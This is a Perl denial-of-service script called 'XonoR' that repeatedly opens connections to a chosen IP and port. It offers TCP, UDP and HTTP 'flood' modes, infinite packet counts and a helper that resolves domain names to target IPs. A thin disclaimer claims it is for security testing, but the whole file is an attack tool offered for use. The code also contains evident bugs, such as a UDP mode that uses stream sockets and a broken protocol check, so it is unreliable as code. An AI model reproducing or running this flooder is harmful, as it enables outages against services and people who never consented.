####################
## LINE ARGUEMENT ##
####################
use IO::Socket::INET; 

## ASSIGN ARGS ##

my $remote_host = $ARGV[0];
my $remote_port = $ARGV[1];
my $proto = $ARGV[2];
my $packets = $ARGV[3];
my $timeout = $ARGV[4];

## SHOWS WARNING MESSAGE
system("clear || cls");
print q{
              ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\  A         
       ::::::;       ;          OOOOO\  T        
       ;:::::;       ;         OOOOOOOO  T      
      ,;::::::;     ;'         / OOOOOOO  A     
    ;:::::::::`. ,,,;.      S /  / DOOOOOO A    
  .';:::::::::::::::::;,   O /  /     DOOOO C  
 ,::::::;::::::;;;;::::;, D /  /        DOOO K 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /  Coded By    DOO
`:`:::::::`;:::::: ;::::::#/       Ghosty  DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#   
   
};
print "Please know that XonoR is not for bad purposes.\n";
print "Using this tool to take down an IP, is illegal if you have no permissions or right to do so,\n";
print "XonoR is a powerful tool which should be used for security testing only! (Please)\n";
print "If using this tool on goverment networks etc we are not respondable, only you.\n";
print "\n";
print "HTTP Flood was added to XonoR but still in beta, its more a slow HTTP flooder,\n";
print "To make it clear depends on the target some are very fast some are slow.\n";
print "\n";
print "Make sure if TCP flooding or UDP flooding needs to attack a valid port.\n";
print "Make sure the port you are flooding is UDP if UDP is selected etc.\n";
print "\n";
print "Press any keys to continue: ";
chop ($WarnCont = <stdin>);

## CHECKS IF ITS GRAB IP ##
if($remote_host eq '--grab-ip' || $remote_host eq '--grab-ip' || $remote_port eq '--grab-ip' || $remote_port eq '--grab-ip' || $proto eq '--grab-ip' || $proto eq '--grab-ip' || $timeout eq '--grab-ip' || $timeout eq '--grab-ip' || $verbose eq '--grab-ip' || $verbose eq '--grab-ip' || $logs eq '--grab-ip' || $logs eq '--grab-ip') {

  system("clear || cls");
  print q{
              ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\  A         
       ::::::;       ;          OOOOO\  T        
       ;:::::;       ;         OOOOOOOO  T      
      ,;::::::;     ;'         / OOOOOOO  A     
    ;:::::::::`. ,,,;.      S /  / DOOOOOO A    
  .';:::::::::::::::::;,   O /  /     DOOOO C  
 ,::::::;::::::;;;;::::;, D /  /        DOOO K 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /  Coded By    DOO
`:`:::::::`;:::::: ;::::::#/       Ghosty  DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#   
   
};
print "Example: facebook.com or www.google.com\n";
print "Please enter the target domain's name: ";
chop ($DmnTarget = <stdin>);
print "Domain Name = $DmnTarget\n";
print "[!] Grabbing ip ...\n";
use Socket;
$iaddr = inet_aton("$DmnTarget"); 
$name  = gethostbyaddr($iaddr, AF_INET);
# or going the other way
$straddr = inet_ntoa($iaddr);
print "IP: $straddr / Name: $name\n";
print "Done! \n";
exit(0);
}

## CHECKS IF -h OR --help IS CALLED ##
if($remote_host eq '-h' || $remote_host eq '--help' || $remote_port eq '-h' || $remote_port eq '--help' || $proto eq '-h' || $proto eq '--help' || $timeout eq '-h' || $timeout eq '--help' || $verbose eq '-h' || $verbose eq '--help' || $logs eq '-h' || $logs eq '--help') {
  system("clear || cls");
  print q{
              ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\  A         
       ::::::;       ;          OOOOO\  T        
       ;:::::;       ;         OOOOOOOO  T      
      ,;::::::;     ;'         / OOOOOOO  A     
    ;:::::::::`. ,,,;.      S /  / DOOOOOO A    
  .';:::::::::::::::::;,   O /  /     DOOOO C  
 ,::::::;::::::;;;;::::;, D /  /        DOOO K 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /  Coded By    DOO
`:`:::::::`;:::::: ;::::::#/       Ghosty  DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#   
   
}; 
  print "Usage: \n";
  print " perl xonor.pl <target> <port> <protocol> <packets> <timeout> \n";
  print " \n";
  print "TCP Flood Usage: \n";
  print " perl xonor.pl <target_ip> <tcp_port> <packets> <timeout>\n";
  print " \n";
  print "UDP Flood Usage: \n";
  print " perl xonor.pl <target_ip> <udp_port> <packets> <timeout>\n";
  print " \n";
  print "HTTP Flood Usage: \n";
  print " perl xonor.pl <target_ip> <http/https_port> <packets> <timeout>\n";
  print " HTTP TIP: Do 80 for default http port.\n";
  print " TIP: Do 0 for timeout if you want no timeout(CAUSION!).\n";
  print " \n";
  print "Arguments: \n";
  print " \n";
  print " Target : Needs an ip, XonoR doesn't support any url. Use --grab-ip to grab the ip of a domain! \n";
  print " Port : Needs TCP or UDP port. \n";
  print " Protocol : TCP or UDP or HTTP. \n";
  print " Packets : Number of packets to send! do 0 for infinite packets. \n";
  print " Timeout : Seconds between each packet, 0 for no time(CAUSION!). \n";
  print " \n";
  print "Misc Commands:  \n";
  print " --grab-ip : Grabs an IP/Name from Domain\n";
  print " \n";
  exit (0);
}

## LOADING BANNER ##
system("clear || cls");
my $BannerCnt = 4;
$Dots = '.';
while($BannerCnt > 0){
   system("clear || cls");
   print q{
              ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\  A         
       ::::::;       ;          OOOOO\  T        
       ;:::::;       ;         OOOOOOOO  T      
      ,;::::::;     ;'         / OOOOOOO  A     
    ;:::::::::`. ,,,;.      S /  / DOOOOOO A    
  .';:::::::::::::::::;,   O /  /     DOOOO C  
 ,::::::;::::::;;;;::::;, D /  /        DOOO K 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /  Coded By    DOO
`:`:::::::`;:::::: ;::::::#/       Ghosty  DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#   
   
};
   # count down
   $BannerCnt--;
   $size = rand() * 8921873 * 99919988;
   $size2 = rand() * 8921873 * 99919988 * 2;
   $size3 = rand() * 8921873 * 99919988 * 2 + 99919988;
   print "\r[!] Launching XonoR$Dots\n";
   #
   
   if($BannerCnt == 3){
   $Dots = '..';
   sleep(1);
   } elsif($BannerCnt == 2){
   $Dots = '...';
   sleep(1);
   } elsif($BannerCnt == 1){
   $Dots = '';
   sleep(1);
   }
   
   if($BannerCnt == 0){
   print "Finish loading XonoR!...";
   #
   sleep(2);
   }
}
   system("clear || cls"); 
   print " \n";
if (not defined $remote_host || $remote_host eq ''){
   print "Oops, please input a valid target!\n";
   exit (0);
} elsif (not defined $remote_port || $remote_port eq '') {
    print "Oops, please input a valid port!\n";
	exit (0);
} else {
   print "Remote Target = $remote_host!\n";
   print "Trying to reach host, host checking! ...\n";
   $ping=system("curl $remote_host:$remote_port >/null 2>&1");
   if ($ping eq 0) {
       print "[+] Seems like host is alive!\n";
       print "[+] Launching DoS option! ...\n";
	   # 
	   sleep(2);
	   Check();
    } else {
       print "[!] Seems like host is not alive!\n";
       print "[!] Please check if the port you are trying to attack is opened!\n";
	   print "Would you like to still continue?:(Y/N) \n";
	   chop ($Continue = <stdin>);
	   if($Continue eq 'Y' || $Continue eq 'y') {
         Check();	   
	   } else {
	     print "Ok, exiting! \n";
		 exit(0)	   
	   }
    }
     print " \n";
}
	 

## CHECKS OPTIONS ##
sub Check{
my $counter = 5;
system("clear || cls");
print q{
              ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ~;           OOO\  A         
       ::::::;       ;          OOOOO\  T        
       ;:::::;       ;         OOOOOOOO  T      
      ,;::::::;     ;'         / OOOOOOO  A     
    ;:::::::::`. ,,,;.      S /  / DOOOOOO A    
  .';:::::::::::::::::;,   O /  /     DOOOO C  
 ,::::::;::::::;;;;::::;, D /  /        DOOO K 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /  Coded By    DOO
`:`:::::::`;:::::: ;::::::#/       Ghosty  DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#   

};
print "++(Checking Infos)++\n";
print "Target: $remote_host\n";
print "Port: $remote_port\n";
## CHECKS FOR PROTOCOL ##
if(not defined $proto || $proto eq ''){
   print "Oops, please input protocol! \n";
   print "Avaible protocols: \n";
   print " TCP / tcp   : TCP Flood\n";
   print " UDP / udp   : UDP Flood\n";
   print " HTTP / http : HTTP Flood (Beta)\n";
   print " \n";
   exit(0);
} 
if($proto eq 'tcp' || $proto eq 'TCP'){
   print "Protocol: $proto\n";
}
if($proto eq 'udp' || $proto eq 'UDP'){
   print "Protocol: $proto\n";
}
if($proto eq 'http' || $proto eq 'HTTP'){
   print "Protocol: $proto\n";
}
if($proto != 'tcp' || $proto != 'TCP' || $proto != 'UDP' || $proto != 'udp' || $proto != 'HTTP' || $proto != 'http') {
   print 'NOPE!\n';
   exit(0);
}
## CHECKS FOR PACKETS ##
if($packets > 1000){
   print "Packets: $packets\n";
   print "   Shit dawg! You selected more than 1,000 packets!\n";
   print "   By choosing that amount your PC (if weak) can crash!\n";
}
if($packets eq '0' || not defined $packets || $packets eq ''){
   print "Packets: Infinite\n";
   print "   0 Packets were defined or not at all.\n";
   print "   By default we will set for infinite!\n";
   $packets = 500;
   $InfPacket = 'true';
} else {
   print "Packets: $packets\n";
   $CntPackets = $packets;
}

print "Press any keys to continue: \n";
chop ($Continue = <stdin>);
## CHECKS WHAT TYPE OF DOS SHOULD BE DONE ##
if($proto eq 'tcp' || $proto eq 'TCP'){
   use IO::Socket::INET; 
   TCPFlood();
}
if($proto eq 'udp' || $proto eq 'UDP'){
   UDPFlood();
}
if($proto eq 'http' || $proto eq 'HTTP'){
   HTTPFlood();
}


}

## TCP FLOOD ##
sub TCPFlood{
print "$remote_host:$remote_port\n";
use IO::Socket::INET; 
print q{
              ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ~;           OOO\  A         
       ::::::;       ;          OOOOO\  T        
       ;:::::;       ;         OOOOOOOO  T      
      ,;::::::;     ;'         / OOOOOOO  A     
    ;:::::::::`. ,,,;.      S /  / DOOOOOO A    
  .';:::::::::::::::::;,   O /  /     DOOOO C  
 ,::::::;::::::;;;;::::;, D /  /        DOOO K 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /  Coded By    DOO
`:`:::::::`;:::::: ;::::::#/       Ghosty  DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#   
};
print "   TCP Flood:DOS   $remote_host:$remote_port\n";
print("++++++++++++++++++++ ATTACKING +++++++++++++++++++\n");
print("Simply do CTRL+C to stop the attack!\n");
print("Starting TCP Flood attack: $remote_host:$remote_port: Packets: $packets\n");
while($packets > 0){
  
   # count down
   $packets--;
   $socket = IO::Socket::INET->new(PeerAddr => $remote_host,
                                PeerPort => $remote_port,
                                Proto    => "$proto",
                                Type     => SOCK_STREAM)
    or die "Couldn't connect to $remote_host:$remote_port : $!\n";
	
    # and terminate the connection when we're done.
    close($socket);
    print "$packets.:/ PACKET SENT /: TCP Flood: $remote_host:$remote_port\n";

 
    # pause program for whatever the second the user has choosen!
	sleep($timeout);
	
   if($packets == 0){
 print("+++++++++++++++++++ ATTACK DONE +++++++++++++++++++\n");
 print("!. The DOS attack is done!, thanks for using XonoR!\n");
 print("!. $CntPackets packets were successfully sent!\n");
 if($InfPacket eq 'true'){
    print "[!] Re-setting packets to 500 for inifite uses...\n";
	$packets = 500;
 } else {
 exit(0); 
 }
   } 
 $SIG{'INT'} = \&interrupt;
 sub interrupt {
 print "[!]Stopping TCP Flood attack...\n";
 #
 sleep(2);
 print "[+]Done! Thanks for using XonoR!\n";
 exit(0);
 }
}
}
sub UDPFlood{
print "$remote_host:$remote_port\n";
use IO::Socket::INET; 
print q{
              ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ~;           OOO\  A         
       ::::::;       ;          OOOOO\  T        
       ;:::::;       ;         OOOOOOOO  T      
      ,;::::::;     ;'         / OOOOOOO  A     
    ;:::::::::`. ,,,;.      S /  / DOOOOOO A    
  .';:::::::::::::::::;,   O /  /     DOOOO C  
 ,::::::;::::::;;;;::::;, D /  /        DOOO K 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /  Coded By    DOO
`:`:::::::`;:::::: ;::::::#/       Ghosty  DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#   
};
print "   UDP Flood:DOS   $remote_host:$remote_port\n";
print("++++++++++++++++++++ ATTACKING +++++++++++++++++++\n");
print("Simply do CTRL+C to stop the attack!\n");
print("Starting UDP Flood attack: $remote_host:$remote_port: Packets: $packets\n");
while($packets > 0){
  
   # count down
   $packets--;
   $socket = IO::Socket::INET->new(PeerAddr => $remote_host,
                                PeerPort => $remote_port,
                                Proto    => "$proto",
                                Type     => SOCK_STREAM)
    or die "Couldn't connect to $remote_host:$remote_port : $!\n";
	
    # and terminate the connection when we're done.
    close($socket);
    print "$packets.:/ PACKET SENT /: UDP Flood: $remote_host:$remote_port\n";

 
    # pause program for whatever the second the user has choosen!
	sleep($timeout);
	
   if($packets == 0){
 print("+++++++++++++++++++ ATTACK DONE +++++++++++++++++++\n");
 print("!. The DOS attack is done!, thanks for using XonoR!\n");
 print("!. $CntPackets packets were successfully sent!\n");
 if($InfPacket eq 'true'){
    print "[!] Re-setting packets to 500 for inifite uses...\n";
	$packets = 500;
 } else {
 exit(0); 
 }
   } 
 $SIG{'INT'} = \&interrupt;
 sub interrupt {
 print "[!]Stopping UDP Flood attack...\n";
 #
 sleep(2);
 print "[+]Done! Thanks for using XonoR!\n";
 exit(0);
 }
}
}
sub HTTPFlood{
print "$remote_host:$remote_port\n";
use IO::Socket::INET; 
print q{
              ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ~;           OOO\  A         
       ::::::;       ;          OOOOO\  T        
       ;:::::;       ;         OOOOOOOO  T      
      ,;::::::;     ;'         / OOOOOOO  A     
    ;:::::::::`. ,,,;.      S /  / DOOOOOO A    
  .';:::::::::::::::::;,   O /  /     DOOOO C  
 ,::::::;::::::;;;;::::;, D /  /        DOOO K 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /  Coded By    DOO
`:`:::::::`;:::::: ;::::::#/       Ghosty  DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#   
};
print "   HTTP Flood:DOS   $remote_host:$remote_port\n";
print("++++++++++++++++++++ ATTACKING +++++++++++++++++++\n");
print("Simply do CTRL+C to stop the attack!\n");
print("Starting UDP Flood attack: $remote_host:$remote_port: Packets: $packets\n");
while($packets > 0){
  
   # count down
   $packets--;
   my $socket = IO::Socket::INET->new(
                                PeerAddr => $remote_host,
                                PeerPort => $remote_port,
                                Proto    => "tcp") or die "Couldn't connect to $remote_host:$remote_port : $!\n";
    print $socket 'GET $url HTTP/1.0\n\n';
    close ($socket);
	
    # and terminate the connection when we're done.
    close($socket);
    print "$packets.:/ PACKET SENT /: HTTP Flood: $remote_host:$remote_port\n";
	
    # pause program for whatever the second the user has choosen!
	sleep($timeout);
	
   if($packets == 0){
 print("+++++++++++++++++++ ATTACK DONE +++++++++++++++++++\n");
 print("!. The DOS attack is done!, thanks for using XonoR!\n");
 print("!. $CntPackets packets were successfully sent!\n");
 if($InfPacket eq 'true'){
    print "[!] Re-setting packets to 500 for inifite uses...\n";
	$packets = 500;
 } else {
 exit(0); 
 }
   } 
 $SIG{'INT'} = \&interrupt;
 sub interrupt {
 print "[!]Stopping UDP Flood attack...\n";
 #
 sleep(2);
 print "[+]Done! Thanks for using XonoR!\n";
 exit(0);
 }
}
}

